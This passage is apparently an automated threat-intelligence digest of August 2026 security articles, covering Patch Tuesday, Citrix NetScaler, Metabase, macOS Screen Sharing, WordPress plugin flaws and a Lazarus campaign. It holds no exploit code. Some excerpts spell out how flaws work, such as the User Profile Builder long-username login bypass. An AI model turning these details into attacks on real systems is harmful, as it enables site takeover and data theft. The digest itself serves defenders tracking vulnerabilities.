Back to Blog Exposure Management Patch Tuesday - August 2026 Adam Barnett Aug 11, 2026 | Last updated on Aug 11, 2026 | 50 min read Microsoft is publishing 421 vulnerabilities on August 2026 Patch Tuesday , including 236 vulnerabilities in Windows. This is lower volume than last month’s record-breaking behemoth, but still one of the largest Patch Tuesday totals ever. There is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for one of the vulnerabilities published today, as well as public disclosure for two others, although the Notable CVEs section of the Security Update Guide omits one of these. As usual, browser vulns are not included in the Patch Tuesday count above, but unusually, Microsoft does not appear to have published any desktop browser security patches so far this month. SharePoint: critical RCE chain by Rapid7 Today sees the publication of CVE-2026-63520 , a high-severity remote code execution in Microsoft SharePoint. Discovered by Rapid7 Senior Principal Security Researcher Stephen Fewer , and published today in coordination with Microsoft; this vulnerability is the second in a pair of exploits which, when chained together, comprise a critical unauthenticated remote code execution vulnerability in a vulnerable SharePoint server. Patches are available for SharePoint Server Subscription Edition, 2019, and 2016. Alongside today’s coordinated disclosure of CVE-2026-63520 , Rapid7 has now published a detailed technical analysis and proof-of-concept for CVE-2026-55040 , the first vulnerability in the chain. AFD for Winsock: zero-day EoP Rapid7 has previously discussed the Windows Ancillary Function Driver for WinSock, and today it returns to center stage with another exploited-in-the-wild elevation-of-privilege vulnerability. Successful exploitation requires winning a race condition, which increases the difficulty of producing a stable exploit. This also helps keep the CVSS v3 base score down to 7.0, along with a Microsoft proprietary severity ranking of merely important, rather than critical. However, with no user interaction required, and a prize of SYSTEM-level access, CVE-2026-68820 is just what the doctor ordered, if the doctor is based in Pyongyang and wants to steal your cryptocurrency. Microsoft credits CVE-2026-68820 to researchers at Check Point (misspelled “Checkpoint” on the advisory). CVE-2026-68820 isn’t yet listed on CISA KEV, but it will be soon. What’s the opposite of coordinated disclosure? This month’s entry in the ongoing saga of Microsoft vs. a pseudonymous security researcher with a clear dislike of Microsoft comes in the form of CVE-2026-62832 , an elevation of privilege vulnerability in the Windows User Profile Service. Exploitation leads to administrator rights on the local asset, and is achieved via a specially crafted application, which is Microsoft corporate argot for exploit code. Between the public disclosure and the FAQ, which describes an authenticated attacker who has credentials for another account and loads another user’s registry hive, the advisory is a solid match for Nightmare Eclipse’s description of LegacyHive, which Rapid7 discussed last month . Patch Tuesday watchers will have been wondering whether Nightmare Eclipse would continue the pattern of the past few months by dropping yet another zero-day vuln late on Patch Tuesday to maximize friction and inconvenience for Microsoft. Wonder no more, because the new entry on this growing list of headaches is ShieldBreak. Nightmare Eclipse describes ShieldBreak as a full patch bypass for RoguePlanet, a previous entry in the series which Microsoft patched as CVE-2026-50656 during July, a month after its public disclosure. Both vulnerabilities are therefore elevation-of-privilege to SYSTEM vulnerabilities in Defender. Container isolation filesystem driver: isolation failure, tampering CVE-2026-72971 describes a tampering vulnerability in the
```

#### Corroborating sources (2)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Patch Tuesday - August 2026
  - Published: 2026-08-11T21:10:55+00:00
  - Link: https://www.rapid7.com/blog/post/em-patch-tuesday-august-2026
  - Summary: Microsoft is publishing 421 vulnerabilities on August 2026 Patch Tuesday , including 236 vulnerabilities in Windows. This is lower volume than last month’s record-breaking behemoth, but still one of the largest Patch Tuesday totals ever. There is no reason to suppose that Patch Tuesday will ever return to the lower volumes we saw prior to 2026. Microsoft is aware of exploitation in the wild for one of the vulnerabilities published today, as well as public disclosure for two others, although the Notable CVEs section of the Security Update Guide omits one of these. As usual, browser vulns are not included in the Patch Tuesday count above, but unusually, Microsoft does not appear to have published any desktop browser security patches so far this month. SharePoint: critical RCE chain by Rapid7 Today sees the publication of CVE-2026-63520 , a high-severity remote code execution in Microsoft SharePoint. Discovered by Rapid7 Senior Principal Security Researcher Stephen Fewer , and published t
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Researchers Disclose AI-Assisted SharePoint Exploit Chain Reaching Unauthenticated RCE
  - Published: 2026-08-11T16:47:44+00:00
  - Link: https://thehackernews.com/2026/08/researchers-disclose-ai-assisted.html
  - Summary: Security researchers found a way to enter Microsoft SharePoint servers as any user, including an administrator, with no valid account. A significant part of the work that found it was done through an AI agent. The flaw, tracked as CVE-2026-55040 (CVSS 9.1), affects SharePoint Server Subscription Edition, SharePoint Server 2019, and SharePoint Server 2016. Microsoft's

### Cluster 0e9ca139ce — score 44

- Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?))
- Source: watchTowr Labs (offensive_vulnerability_research)
- Published: 2026-08-14T07:08:20+00:00
- Link: https://labs.watchtowr.com/youre-back-in-the-room-citrix-netscaler-pre-auth-rce-cve-2026-8452/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: CVE-2026-8452, Citrix

#### Cluster taxonomy (union across members)
- affected_products: Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-8452
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research, tier_5_chatter

#### Primary article taxonomy
- affected_products: Citrix, OpenAI/ChatGPT
- cve_ids: CVE-2026-8452
- urgency_signals: preauth_unauth
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be
```

#### Full body

```
Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be a bad person or we may have to fire you” speech. But, you know what’s coming soon. It’s your favorite part of the onboarding process when you’ve started a new role. It begins! The password policy requirements. You straighten your tie, because sure as heck, your SSLVPN credentials will not be the starting point for this organization. Not this time. Not again. You swore to yourself that you’d use a symbol this time. Wait, did they just say NetScalers? The world freezes around you. How are you back in the hellscape? You panic - what does a symbol matter in comparison to the traumatic nightmares you relive every day? You realize the truth - nobody cares whether your password has a symbol or not. It’s already over for you. Welcome back to another watchTowr Labs blog post. It’s been three years since the last publicly documented NetScaler RCE writeup. ChatGPT tells us that today we’re changing that. Exciting. In this post, we’re going to walk through a vulnerability that was resolved as part of a recent NetScaler ADC and NetScaler Gateway Security Bulletin . As part of this bulletin, Citrix subtly? silently? loudly? patched a Heap Overflow vulnerability that we’re going to walk through today and show how it can be used to achieve Remote Code Execution. 0:00 / 0:31 1× Who Is Citrix NetScaler, and Why Was A Gateway Their First C Project? Citrix NetScaler (formally rebranded, then un-rebranded, in the way that only enterprise networking vendors can truly pull off) is a family of application delivery controllers and VPN gateway appliances found in virtually every large enterprise network on the planet. NetScaler handles load balancing, SSL offloading, authentication, and remote access - and NetScaler Gateway specifically serves as the front door for thousands of organizations' remote access infrastructure. Setting The Scene To fuel today's analysis, we're analyzing and leveraging a vulnerable NetScaler 13.1 appliance, configured to leverage SAML. For those wondering what is actually vulnerable, based on our testing, the vulnerability we’re discussing today is reachable when the Netscaler appliance is configured to use SAML as either a Service Provider (SP) or an Identity Provider (IdP). Citrix lists the following versions as affected: NetScaler ADC and NetScaler Gateway 14.1 BEFORE 14.1-72.61 NetScaler ADC and NetScaler Gateway 13.1 BEFORE 13.1-63.18 What Are We Looking At Today? This is where things get a little confusing, annoying, or mysterious - your choice of word reflects your commitment to the pledge . While we’d love to tell you we are definitely analyzing CVE-2026-8452, typical Citrix shenanigans (in our view) prevent us from doing so. However, we believe this is CVE-2026-8452 given its description as a “Memory Overflow” vulnerability. While Citrix doesn't correlate individual CVEs with the researchers credited in the advisory, one of the researchers credited is Michael Tucker from the XOR team at JPMorgan Chase (the others include ourselves, and we can rule out our vulnerabilities). Adding fuel to our baseless theory, this vulnerability is interesting and complex enough that it’s plausible that this is the output of Mythos-aided research - the model JPMorgan very publicly has access to. Do we have any evidence of that? Absolutely not. Is it fun to speculate? Always. Do we have better things to do? Anyway, Let’s Get Into it As part of our typical analysis process, especially when dealing with multiple patched vulnerabilities bundled into a single fix, we didn’t start with a specific focus. Instead, we asked, “What changed?” Specifically the nsppe binary, NetScaler's packet-processing engine, showed a significant amount of changes - with plenty of stripped symbols thrown in for good measure. Faced with the prospec
```

#### Corroborating sources (2)

- **watchTowr Labs** (offensive_vulnerability_research)
  - Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?))
  - Published: 2026-08-14T07:08:20+00:00
  - Link: https://labs.watchtowr.com/youre-back-in-the-room-citrix-netscaler-pre-auth-rce-cve-2026-8452/
  - Summary: Suddenly, you’re in a room. You look around - oh, you’re surrounded by other new starters at your new job. Yes, it’s Monday, and you’re being onboarded. You know the drill - it’s the typical enterprise “please don’t be
- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: You’re Back In The Room (Citrix NetScaler Pre-Auth RCE CVE-2026-8452(?)) - watchTowr Labs
  - Published: 2026-08-14T07:10:17+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vo06aj/youre_back_in_the_room_citrix_netscaler_preauth/
  - Summary: submitted by /u/dx7r__ [link] [comments]

### Cluster 67b968df05 — score 42

- Title: CVE-2026-72898 | Metabase Pre-Authentication SQL Injection Vulnerability
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-08-13T17:45:09+00:00
- Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-72898/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-72898

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- cve_ids: CVE-2026-18556, CVE-2026-18577, CVE-2026-72898
- urgency_signals: actively_exploited, critical_cvss, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- cve_ids: CVE-2026-72898, CVE-2026-18556, CVE-2026-18577
- urgency_signals: actively_exploited, zero_day, preauth_unauth, critical_cvss
- content_type: vulnerability_disclosure
- confidence_tier: tier_1_offensive_research

#### Summary

```
CVE-2026-72898 is a critical pre-authentication SQL injection vulnerability affecting Metabase. NodeZero® Rapid Response safely validates whether the actively exploited vulnerability is exploitable in your environment.
```

#### Full body

```
Metabase Pre-Authentication SQL Injection Vulnerability CVE-2026-72898 is a critical unauthenticated SQL injection vulnerability in Metabase, a widely used open-source business intelligence and data analytics platform. Successful exploitation can give an attacker administrator access to the affected Metabase instance, allowing them to change application configuration, steal stored credentials for connected databases, read data accessible through those connections, and export data. The vulnerability is rated CVSS 10.0 (Critical), the highest possible severity rating. Metabase has confirmed that attackers are actively exploiting the vulnerability against real-world environments. Technical Details CVE-2026-72898 allows an unauthenticated remote attacker to inject arbitrary SQL into the Metabase application database. No authentication or user interaction is required, and the vulnerability can be exploited remotely over the network with low attack complexity. Successful exploitation can provide administrator access to the affected Metabase instance. From there, an attacker could: Change Metabase application configuration Steal stored credentials for connected databases Read data accessible through those database connections Export data The vulnerability is rated CVSS 10.0 (Critical), with the CVSS 3.1 vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H . Metabase has confirmed active exploitation. Stop Guessing, Start Proving Schedule a demo NodeZero® Proactive Security Platform — Rapid Response A NodeZero Rapid Response test has been developed to safely validate whether this SQL injection vulnerability can be exploited in your environment. The test executes real attack techniques without causing damage, giving teams immediate clarity on exposure. Run the Rapid Response test: Launch from the NodeZero platform to determine whether exploitation is possible Patch immediately: Upgrade to the appropriate fixed Metabase release for your deployment. If immediate patching is not possible, temporarily block the /api/session/reset_password endpoint Re-run the test: Confirm the vulnerability is no longer exploitable after remediation Affected versions & patch Affected Metabase identifies the following affected version ranges: >= x.58.0, < x.58.23 >= x.59.0, < x.59.20 >= x.60.0, < x.60.16 >= x.61.0, < x.61.10 >= x.62.0, < x.62.8 >= x.63.0, < x.63.3 Fixed Metabase lists the following patched versions: x.58.24 x.59.21 x.60.17 x.61.11 x.62.9 x.63.5 Organizations should upgrade to the patch corresponding to their Metabase major version as soon as possible. Mitigations If immediate upgrading is not possible, Metabase recommends temporarily blocking the /api/session/reset_password endpoint. If this endpoint was publicly accessible, Metabase recommends taking additional steps after upgrading: Revoke all active user sessions Review API keys and delete any unrecognized keys Review administrator accounts for unexpected changes Rotate credentials for connected databases Review data warehouse logs for signs of unauthorized access Review Metabase activity and query history for unexpected or unauthorized activity Timeline August 3, 2026: Metabase discovered attacks against Metabase Cloud involving a previously unknown vulnerability and began investigating and containing the activity. August 6, 2026: Metabase published its security advisory for CVE-2026-72898, confirming the vulnerability as a critical unauthenticated SQL injection with active exploitation. August 6, 2026: Metabase made patched releases available across the affected x.58 through x.63 release branches. August 12, 2026: Horizon3.ai released a NodeZero Rapid Response test for CVE-2026-72898. References Metabase Security Advisory Metabase Security Update CVE.org Record – CVE-2026-72898 The Hacker News – Metabase Zero-Day Exploited in Wild Allows Admin Access Without Authentication Read about other CVEs CVE-2026-18556 and CVE-2026-18577 CVE-2026-18556 and CVE-2026-18577 are authentication bypass
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CVE-2026-72898 | Metabase Pre-Authentication SQL Injection Vulnerability
  - Published: 2026-08-13T17:45:09+00:00
  - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-72898/
  - Summary: CVE-2026-72898 is a critical pre-authentication SQL injection vulnerability affecting Metabase. NodeZero® Rapid Response safely validates whether the actively exploited vulnerability is exploitable in your environment.

### Cluster 1580e2d432 — score 25

- Title: Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer
- Source: Help Net Security (cyber_news_breach_reporting)
- Published: 2026-08-17T12:23:15+00:00
- Link: https://www.helpnetsecurity.com/2026/08/17/apple-macos-screen-sharing-flaw/
- Fetch status: ok
- Member count: 8
- Corroborating source count: 7
- Strong signals: Apple iOS/macOS, CVE-2026-65400

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, credential_theft
- affected_industries: financial_services, government
- affected_products: Apple iOS/macOS, GitHub
- cve_ids: CVE-2026-65400
- urgency_signals: actively_exploited, poc_available
- content_type: news_report, vulnerability_disclosure
- confidence_tier: tier_1_government, tier_3_analysis, tier_4_news

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: financial_services
- affected_products: Apple iOS/macOS
- cve_ids: CVE-2026-65400
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A recently patched security flaw in Apple macOS is being actively exploited by hackers to bypass authentication, gain root access, and install a cryptominer, the Netherlands’ National Cyber Security Centre (NCSC) warns. The vulnerability, tracked as CVE-2026-65400, , let attackers authenticate to macOS Screen Sharing without valid login credentials. Apple fixed the issue with updates to macOS Sequoia (15.7.9), Sonoma (14.8.9), and Tahoe (26.6.1), and advised its macOS users to upgrade their systems. “An authentication … More → The post Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer appeared first on Help Net Security .
```

#### Full body

```
Sinisa Markovic , Managing Editor, Help Net Security August 17, 2026 Share Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer A recently patched security flaw in Apple macOS is being actively exploited by hackers to bypass authentication, gain root access, and install a cryptominer, the Netherlands’ National Cyber Security Centre (NCSC) warns. The vulnerability, tracked as CVE-2026-65400 , , let attackers authenticate to macOS Screen Sharing without valid login credentials. Apple fixed the issue with updates to macOS Sequoia (15.7.9), Sonoma (14.8.9), and Tahoe (26.6.1), and advised its macOS users to upgrade their systems. “An authentication issue was addressed with improved state management,” Apple said in its advisory, crediting researcher Alfredo Pesoli, known as @__rev of Bynario Atlas, for reporting the issue. On August 7, one day after Apple’s fix, the NCSC published its first advisory, urging organizations to update. The warning was informational, since no exploitation had been reported at that point. That changed five days later, on August 12, when the agency raised the advisory’s severity after proof-of-concept code went public and reports of active attacks on exposed systems began arriving. “NCSC has received a report indicating active exploitation of this vulnerability has been observed on multiple systems where port 5900 was reachable from the internet. In all these cases, root access was obtained on the affected system and a Monero crypto miner was installed,” NCSC wrote . Users who can’t patch immediately can disable Screen Sharing manually, by opening System Settings , selecting General , then Sharing , and switching the Screen Sharing toggle off. NCSC hasn’t shared details on the scope of the attacks, including when they started, how many systems were hit, or whether attackers did anything beyond installing the cryptominer. More about Apple CVE macOS vulnerability Share
```

#### Corroborating sources (7)

- **Help Net Security** (cyber_news_breach_reporting)
  - Title: Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer
  - Published: 2026-08-17T12:23:15+00:00
  - Link: https://www.helpnetsecurity.com/2026/08/17/apple-macos-screen-sharing-flaw/
  - Summary: A recently patched security flaw in Apple macOS is being actively exploited by hackers to bypass authentication, gain root access, and install a cryptominer, the Netherlands’ National Cyber Security Centre (NCSC) warns. The vulnerability, tracked as CVE-2026-65400, , let attackers authenticate to macOS Screen Sharing without valid login credentials. Apple fixed the issue with updates to macOS Sequoia (15.7.9), Sonoma (14.8.9), and Tahoe (26.6.1), and advised its macOS users to upgrade their systems. “An authentication … More → The post Attackers exploit patched macOS Screen Sharing flaw to deploy cryptominer appeared first on Help Net Security .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Apple macOS Screen Sharing Flaw Exploited on Internet-Exposed Macs to Install Monero Miner
  - Published: 2026-08-15T07:24:04+00:00
  - Link: https://thehackernews.com/2026/08/apple-macos-screen-sharing-flaw.html
  - Summary: A recently patched security flaw in Apple macOS has come under active exploitation in the wild to deploy a cryptocurrency miner, the Netherlands National Cyber Security Centre (NCSC-NL) has warned. The vulnerability in question is CVE-2026-65400 (CVSS score: 9.8), a critical authentication issue impacting the Screen Sharing component that could allow an attacker already on the network to
- **SANS Internet Storm Center** (government_authoritative)
  - Title: Apple Patches iOS and macOS, (Mon, Aug 17th)
  - Published: 2026-08-17T20:26:39+00:00
  - Link: https://isc.sans.edu/diary/rss/33254
  - Summary: Apple today released updates for iOS/iPadOS (26 and 18) and macOS 26. This update fixes 108 vulnerabilities and comes about two weeks after the much smaller macOS update that addressed the single screen-sharing vulnerability. This vulnerability did not affect iOS/iPadOS.
- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: Recent macOS Screen Sharing Vulnerability Exploited in Attacks
  - Published: 2026-08-17T08:47:38+00:00
  - Link: https://www.securityweek.com/recent-macos-screen-sharing-vulnerability-exploited-in-attacks/
  - Summary: Threat actors gained root access to the vulnerable systems and deployed a Monero miner. The post Recent macOS Screen Sharing Vulnerability Exploited in Attacks appeared first on SecurityWeek .
- **Risky Business News** (practitioner_analysis)
  - Title: Risky Bulletin: US will let private companies carry out offensive cyber ops
  - Published: 2026-08-14T04:37:40+00:00
  - Link: https://risky.biz/RBNEWS600/
  - Summary: The White House will let private companies carry out offensive cyber ops, an AI hacking campaign breached Taiwan’s government, a macOS bug was exploited over the internet to drop cryptominers, and Kenya orders internet cafes to store logs.
- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: New AmnesiaStealer macOS malware hijacks browser sessions via remote control
  - Published: 2026-08-16T15:07:44+00:00
  - Link: https://www.bleepingcomputer.com/news/security/new-amnesiastealer-macos-malware-hijacks-browser-sessions-via-remote-control/
  - Summary: A new information-stealing malware called AmnesiaStealer, which targets macOS users via ClickFix attacks, includes a streaming module that allows the attacker to interactively control the victim's web browser. [...]
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Novel macOS Infostealer AmnesiaStealer Spread via ClickFix
  - Published: 2026-08-14T10:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/macos-infostealer-spread-clickfix/
  - Summary: AmnesiaStealer contains novel functions, including the attackers gaining remote control over the victim’s browser to steal cookie data

### Cluster a7b2f82e67 — score 25

- Title: Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T18:22:09+00:00
- Link: https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
- Fetch status: ok
- Member count: 3
- Corroborating source count: 3
- Strong signals: CVE-2026-15748, WordPress

#### Cluster taxonomy (union across members)
- affected_products: Linux kernel, SonicWall, WordPress
- cve_ids: CVE-2026-15748, CVE-2026-15826, CVE-2026-46300
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research, tier_4_news

#### Primary article taxonomy
- affected_products: WordPress
- cve_ids: CVE-2026-15748, CVE-2026-15826
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748, is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "
```

#### Full body

```
Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads  Ravie Lakshmanan  Aug 17, 2026 Vulnerability / Website Security A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748 , is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "daroo." "This vulnerability makes it possible for unauthenticated attackers to upload arbitrary files, including executable PHP files, to a vulnerable site, which can lead to remote code execution and complete site compromise," Wordfence said in a report published today. That said, a key prerequisite for successful exploitation is that the sites must have a form containing both a File Upload field and a Select field. The vulnerability impacts all versions of the plugin before and including 1.56.1. It has been addressed in version 1.56.2 released on July 31, 2026. Per the WordPress security company, the flaw is a case of arbitrary file upload that resides in the "handle_file_upload()" function, stemming from a lack of sufficient file type validation in user-supplied input. As a result, an unauthenticated attacker can exploit the loophole to upload any file, including a specially crafted PHP file, to a vulnerable site by submitting a form and achieving remote code execution. Armed with this capability, the attacker can seize control of the site. "This is due to insufficient file type validation in handle_file_upload, where the dangerous-extension blocklist performs exact-key matching that is bypassed by pipe-alternative MIME type keys, combined with a public submission handler that trusts attacker-controlled upload field configuration injected via a forged Select field value," Wordfence said. Another aspect worth noting here is that, in the default configuration, files are uploaded to a directory protected by an .htaccess file that prevents PHP execution. But if a site administrator has configured a Custom File Upload Storage root, it may not have the same safeguard as the file is created "only when it is first needed, during a frontend request where the WordPress helper responsible for writing the .htaccess file is not loaded." As a result, requesting the uploaded file is enough to cause the web server to execute the attacker-controlled PHP code. Auth Bypass Flaw in User Profile Builder Plugin The disclosure comes days after Wordfence also highlighted another critical authentication bypass bug in User Profile Builder, which has more than 40,000 active WordPress installations, that could allow unauthenticated attackers to log in as the user with ID 1 (typically the site administrator) and take over the site. The vulnerability, tracked as CVE-2026-15826 (CVSS score: 9.8), was patched on July 16, 2026, with the release of version 3.16.5. All prior versions are affected by the issue, but it is only exploitable on sites where the plugin's Automatically Log In setting is enabled. "This is due to the wppb_log_in_user() function calling absint() on the return value of wp_insert_user() before performing an is_wp_error() check — when a registration is submitted with a 61–70 character username, WordPress core rejects it with a WP_Error object, but absint() coerces that object to the integer 1 before the error check can short-circuit execution, causing the plugin to bind and return a transient-backed autologin nonce tied to user ID 1," Wordfence said . "This makes it possible for unauthenticated attackers to log in as the site's Administrator account (user ID 1), resulting in full administrative takeover of the site." Site owners who have either of the two plugins are advised to apply the updates as soon as possible and ensure their installations are up-to-date. Found this article interesting? Follow us
```

#### Corroborating sources (3)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Forminator WordPress Flaw Can Enable Unauthenticated RCE via Malicious PHP Uploads
  - Published: 2026-08-17T18:22:09+00:00
  - Link: https://thehackernews.com/2026/08/forminator-wordpress-flaw-can-enable.html
  - Summary: A critical security flaw has been disclosed in Forminator Forms, a WordPress plugin with more than 600,000 active installations, that could be exploited to achieve arbitrary code execution on susceptible sites. The vulnerability, tracked as CVE-2026-15748, is rated 9.8 out of 10.0 on the CVSS scoring system. It was discovered and reported by a security researcher who goes by the online alias "
- **Rapid7** (offensive_vulnerability_research)
  - Title: Metasploit Wrap Up: Lot of summer shells and fit http profiles
  - Published: 2026-08-14T21:27:45+00:00
  - Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-lot-of-summer-shells-and-fit-http-profiles
  - Summary: This wrap-up brings a full-on shell parade. Thirteen shiny new modules landed, starting with a buffet of RCEs. WordPress WP2Shell, Ghost CMS, Joomla JCE, Langflow, OpenCATS, Pterodactyl Panel, SonicWall SMA1000, Ray Dashboard, a Pix-for-WooCommerce, and for those who like their exploits closer to the bare-metal, the Fragnesia Linux kernel LPE (CVE-2026-46300). Metasploit also got the glow-up of the summer with the new http malleable profiles, MCP functionality and linux multi fetch payloads (more details on the [official 6.5 release blog post](https://www.rapid7.com/blog/post/pt-metasploit-framework-6-5-released/)!). Windows on ARM confirm to be the new first-class citizenship thanks to brand-new AArch64 reverse-TCP shells (both inline and staged), so your Snapdragon boxes can join the party too. Last but not least, an important message: *Nyan Nyan Nyan Nyan Nyan Nyan.* New module content (13) Ray Dashboard Logs API Path Traversal Author: Richard Howe <rhowe425> Type: Auxiliary Pull re
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: WordPress Plugin Flaw Exposes 40,000 Sites to Admin Takeover
  - Published: 2026-08-17T13:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/wordpress-plugin-flaw-40000-sites/
  - Summary: Critical User Profile Builder flaw let unauthenticated attackers access administrator accounts

### Cluster c13f381a5a — score 24

- Title: Shattering the Dream – When a Job Offer Becomes a Zero-Day Attack
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-11T17:30:00+00:00
- Link: https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, ransomware_extortion, web_shell_backdoor, zero_day
- actor_attribution: Lazarus
- affected_industries: aviation_defense, financial_services
- affected_products: Android, OpenAI/ChatGPT, WordPress
- cve_ids: CVE-2025-49113, CVE-2026-68820
- urgency_signals: zero_day
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, web_shell_backdoor
- actor_attribution: Lazarus
- affected_industries: financial_services, aviation_defense
- affected_products: Android, WordPress, OpenAI/ChatGPT
- cve_ids: CVE-2026-68820, CVE-2025-49113
- urgency_signals: zero_day
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Summary

```
Key Points Introduction Since early 2026, Check Point Research has tracked a wave of the Operation Dream Job campaign. This wave primarily targeted the defense sector worldwide, with a particular emphasis on companies operating in the aerospace and aviation industries. We observed the threat actor distributing modified PDF viewers designed to execute malicious payloads embedded within specially […] The post Shattering the Dream – When a Job Offer Becomes a Zero-Day Attack appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 466 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 421 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Shattering the Dream – When a Job Offer Becomes a Zero-Day Attack August 11, 2026 https://research.checkpoint.com/2026/shattering-the-dream-when-a-job-offer-becomes-a-zero-day-attack/ Key Points Check Point Research is tracking a long‑running campaign called Operation Dream Job , targeting organizations worldwide, with a particular focus on the defense sector. The campaign is affiliated to DPRK-linked Lazarus group and its latest wave focuses on the defense sector in Europe and India. In the latest variant of the Operation Dream Job campaign, the threat actor distributed SecurityPDF , a modified PDF viewer designed to open attacker-crafted PDF documents and execute a new backdoor which we named Troy . During the intrusion, the threat actor exploited CVE-2026-68820 , a zero-day vulnerability in the Microsoft AFD.sys driver, to deploy a new version of FudModule , Lazarus’ kernel-mode rootkit. Following Check Point Research responsible disclosure, Microsoft released a patch as part of their August Patch Tuesday updates. Lazarus also used CVE-2025-49113 to exploit vulnerable Roundcube webmail servers. The compromised servers were infected with RelayShell , a PHP webshell that repurposes compromised web servers as relay nodes within the attacker’s command-and-control infrastructure. At least in one case, a compromised organization in Western Europe was leveraged to conduct a spear-phishing campaign, allowing the attackers to abuse the organization’s reputation and trust to target additional victims. Introduction Since early 2026, Check Point Research has tracked a wave of the Operation Dream Job campaign. This wave primarily targeted the defense sector worldwide, with a particular emphasis on companies operating in the aerospace and aviation industries. We observed the threat actor distributing modified PDF viewers designed to execute malicious payloads embedded within specially crafted PDF files, opened by the user. In this campaign, the threat actor expanded its delivery method by leveraging impersonation websites and search engine optimization (SEO) techniques to distribute the trojanized applications, increasing its credibility and helping it evade some phishing-based detections. During the operation, the threat actor deployed a new version of the FudModule rootkit, exploiting a zero-day local privilege escalation (LPE) vulnerability in the Windows AFD.sys driver, to obtain SYSTEM privileges and disable EDR visibility. Following responsible disclosure, Microsoft assigned the vulnerability CVE-2026-68820 and released a patch on August 11, 2026, as part of their August Patch Tuesday updates. The attackers’ command-and-control infrastructure consists of compromised Roundcube and WordPress servers hosting RelayShell , a new PHP webshell that repurposes compromised web servers as relay nodes. In this blog, we analyze the latest Operation Dream Job campaign, walking through the complete attack chain and providing a technical analysis of the malware and the novel techniques employed throughout the operation, offering new insights into the group’s evolving modus operandi. Infection Chain The Operation Dream Job campaign begins with targeted spear-phishing lures centered on attractive job opportunities at well-known companies in the defense, aerospace, and aviation industries. The exact method used to approach victims in the current campaign remains unclear. However, based on previously documented Dream Job campaigns, we assess that the threat actor likely approached targets through professional networking platforms such as LinkedIn , or directly through m
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Shattering the Dream – When a Job Offer Becomes a Zero-Day Attack
